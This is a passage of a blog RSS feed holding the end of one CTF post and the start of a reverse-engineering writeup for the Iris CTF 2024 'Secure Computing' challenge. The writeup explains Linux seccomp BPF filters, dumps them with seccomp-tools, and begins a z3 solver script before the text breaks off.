&lt;p&gt;&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;compArray = [&lt;span class=&#34;number&#34;&gt;86&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;174&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;206&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;236&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;250&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;118&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;246&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;46&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;204&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;78&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;250&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;174&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;206&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;204&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;78&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;118&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;182&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;166&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;70&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;150&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;206&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;116&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;150&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;118&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; compArray: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;:08b&amp;#125;&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(i) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i = i[::-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    i = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(i, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(i), end = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;And that was my challenge! I hope you had fun solving it and (hopefully) also learned something new while doing it. 😃&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://the-m3chanic.github.io/2024/01/26/Writeup-Secure-Computing-IRIS-CTF-2024/</guid>
            <title>Secure Computing - Iris CTF 2024 Writeup</title>
            <link>https://the-m3chanic.github.io/2024/01/26/Writeup-Secure-Computing-IRIS-CTF-2024/</link>
            <category term="Writeup" scheme="https://the-m3chanic.github.io/categories/Writeup/" />
            <category term="Security" scheme="https://the-m3chanic.github.io/tags/Security/" />
            <category term="Reversing" scheme="https://the-m3chanic.github.io/tags/Reversing/" />
            <category term="CTF" scheme="https://the-m3chanic.github.io/tags/CTF/" />
            <category term="IrisCTF" scheme="https://the-m3chanic.github.io/tags/IrisCTF/" />
            <pubDate>Fri, 26 Jan 2024 01:12:26 +0000</pubDate>
            <description><![CDATA[ &lt;p&gt;Note: My team and I didn&#39;t end up solving this during the CTF, we got very close though. This writeup goes through the steps I took to finish solving the challenge after the CTF ended. Hopefully you learn a thing or two 😃&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Your own secure computer can check the flag! Might have forgotten to add the logic to the program, but I think if you guess enough, you can figure it out. Not sure&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;The description seems to hint at something related to &amp;quot;secure computing&amp;quot;, and so does the challenge name. Interesting, we shall see.&lt;/p&gt;
&lt;h2 id=&#34;understanding-the-challenge&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#understanding-the-challenge&#34;&gt;#&lt;/a&gt; Understanding the challenge&lt;/h2&gt;
&lt;p&gt;Opening the file up in IDA, we see this&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-Secure-Computing-IRIS-CTF/IDA_main.png&#34; alt=&#34;IDA main&#34; /&gt;&lt;/p&gt;
&lt;p&gt;It&#39;s passing our input (flag) as arguments to a syscall, in the form of 6 Qwords.&lt;br /&gt;
Calling syscall &lt;em&gt;0x1337&lt;/em&gt; seems a little odd - because it obviously does not &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaHJvbWl1bS5nb29nbGVzb3VyY2UuY29tL2Nocm9taXVtb3MvZG9jcy8rL21hc3Rlci9jb25zdGFudHMvc3lzY2FsbHMubWQ=&#34;&gt;exist&lt;/span&gt; - so what&#39;s going on here?&lt;/p&gt;
&lt;p&gt;A quick google search with select keywords seems to point us in a single direction&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-Secure-Computing-IRIS-CTF/keyword_search.png&#34; alt=&#34;keyword search&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&amp;lt;br&amp;gt;&lt;/p&gt;
&lt;p&gt;The man page of the  &lt;code&gt;seccomp&lt;/code&gt;  syscall gives us this&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;The seccomp() system call operates on the Secure Computing (seccomp) state &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;of the calling process.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;strong&gt;What does that mean?&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;understanding-seccomp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#understanding-seccomp&#34;&gt;#&lt;/a&gt; Understanding Seccomp&lt;/h2&gt;
&lt;p&gt;Seccomp (or Secure Computing) is a security feature in the Linux kernel that provides an additional layer of protection for applications by restricting the system calls that they make. System calls are the interface between user-space applications and the kernel, allowing programs to request services from the operating system.&lt;/p&gt;
&lt;p&gt;Some important (and interesting) features of Seccomp:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It allows you to define a filter that specifies which system calls are permitted for a particular process. By default, all syscalls are allowed, but with seccomp, you can create a &amp;quot;policy&amp;quot; that restricts this set.&lt;/li&gt;
&lt;li&gt;It uses BPF (Berkeley Packet Filter), which is a virtual machine that can execute a set of instructions to filter system calls. Think of BPF as a &amp;quot;javascript for your kernel&amp;quot;, because it resides in a VM on the kernel and responds to specific events that occur on the system to which it is attached. The filters are written using BPF assembly or even C, which are then compiled to BPF bytecode.&lt;/li&gt;
&lt;li&gt;It offers mainly 2 modes of operation - &lt;em&gt;strict&lt;/em&gt; &amp;amp; &lt;em&gt;filter&lt;/em&gt;. In strict mode, the process starts with a seccomp filter in place, and any attempt to make an unallowed system call results in the termination of the process. Whereas in filter mode, the filter is applied only when explicitly requested by the process (we will look at the &amp;quot;how&amp;quot; of this later).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Looking for syscalls with the calling number  &lt;code&gt;317&lt;/code&gt;  (seccomp&#39;s syscall number), we find this&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-Secure-Computing-IRIS-CTF/syscall_1337.png&#34; alt=&#34;Seccomp syscall&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Hmm, let&#39;s look at the arguments passed to it&lt;br /&gt;
The prototype of the seccomp syscall looks like this:&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;syscall(SYS_seccomp, unsigned int operation, unsigned int flags, void *args);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Here, it seems like  &lt;code&gt;operation&lt;/code&gt;  is set to 1&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;The system calls allowed are defined by a pointer to a Berkeley Packet &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Filter (BPF) passed via args.  This argument is a pointer to a struct &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sock_fprog; it can be designed to filter arbitrary system calls and &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system call arguments.  If the filter is invalid, seccomp() fails,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;returning EINVAL in errno.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;In order to use the SECCOMP_SET_MODE_FILTER operation, either the calling &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;thread must have the CAP_SYS_ADMIN capability in its user namespace, or the &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;thread must already have the no_new_privs bit set.  If that bit was not &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;already set by an ancestor of this thread, the thread must make the following&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;call:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    prctl(PR_SET_NO_NEW_PRIVS, 1);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Both of these are being done in our binary. Let us see what the man page says about those BPF instructions containing the actual filters for our input, which will allow us to solve the challenge.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;When adding filters via SECCOMP_SET_MODE_FILTER, args points to a filter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;program:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   struct sock_fprog &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       unsigned short      len;    /* Number of BPF instructions */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       struct sock_filter *filter; /* Pointer to array of&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                                      BPF instructions */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Each program must contain one or more BPF instructions:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   struct sock_filter &amp;#123;            /* Filter block */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       __u16 code;                 /* Actual filter code */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       __u8  jt;                   /* Jump true */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       __u8  jf;                   /* Jump false */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;       __u32 k;                    /* Generic multiuse field */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Found our instructions!&lt;br /&gt;
So now our approach would be to extract these instructions and disassemble the BPF bytes to see if we can make sense of the filter and reverse it. But let&#39;s see if any tool exists that can already do it for us, just to make our lives a little easier 😃&lt;/p&gt;
&lt;p&gt;Another quick google search leads us to &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkOTQyai9zZWNjb21wLXRvb2xz&#34;&gt;seccomp-tools&lt;/span&gt;, something that exactly matches the description of what we&#39;re looking for.&lt;/p&gt;
&lt;p&gt;To extract the filters from the binary, we simply run:&lt;br /&gt;
&lt;figure class=&#34;highlight sh&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;seccomp-tools dump ./chal&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;But doing this yields no result, why&#39;s that?&lt;br /&gt;
Reading the GitHub page of seccomp-tools, we can see this&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Dumps the seccomp BPF from an execution file. This work is done by utilizing &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the ptrace syscall.&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
And we have a ptrace syscall in our binary, which is obviously causing the issue - so let&#39;s patch that out.&lt;/p&gt;
&lt;p&gt;Now running seccomp-tools:&lt;br /&gt;
&lt;img data-src=&#34;/images/post_images/Writeup-Secure-Computing-IRIS-CTF/seccomp_dump.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Bingo!&lt;/p&gt;
&lt;p&gt;But one thing we have to keep in mind, is the loop in which  &lt;code&gt;seccomp&lt;/code&gt;  is being called. Note that it is not just one filter being set, it is &lt;em&gt;eight&lt;/em&gt; of them.&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/images/post_images/Writeup-Secure-Computing-IRIS-CTF/8-filters.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;v0&lt;/code&gt;  is acting as the loop constraint here, making it run for 8 times, meaning 8 filters being set.&lt;br /&gt;
To dump all 8 filters, we can use the  &lt;code&gt;-l&lt;/code&gt;  flag with seccomp-tools.&lt;br /&gt;
And to clear out all the other garbage being printed along with the output, we can use a little bit of bash.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;seccomp-tools dump ./chal -l 8 | grep -v &lt;span class=&#34;string&#34;&gt;&amp;quot;=======|CODE&amp;quot;&lt;/span&gt; | &lt;span class=&#34;built_in&#34;&gt;cut&lt;/span&gt; -d&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt; -f7- &amp;gt; disasm.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Now that we have all 8 filters in a single file, time to solve for the constraints.&lt;/p&gt;
&lt;h2 id=&#34;solving-the-challenge&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#solving-the-challenge&#34;&gt;#&lt;/a&gt; Solving the challenge&lt;/h2&gt;
&lt;p&gt;Looking at the file (and from the challenge, too), we can see that we&#39;ll have 6 QWORDS to input, which it checks and returns  &lt;code&gt;KILL&lt;/code&gt;  if it&#39;s wrong and  &lt;code&gt;ERRNO(0)&lt;/code&gt;  if it&#39;s correct.&lt;br /&gt;
First thing that comes to mind is z3, so let&#39;s go for that.&lt;/p&gt;
&lt;p&gt;Here is my script to parse the file and add constraints and &amp;quot;emulate&amp;quot; the filter on my args&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight py&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; z3 &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 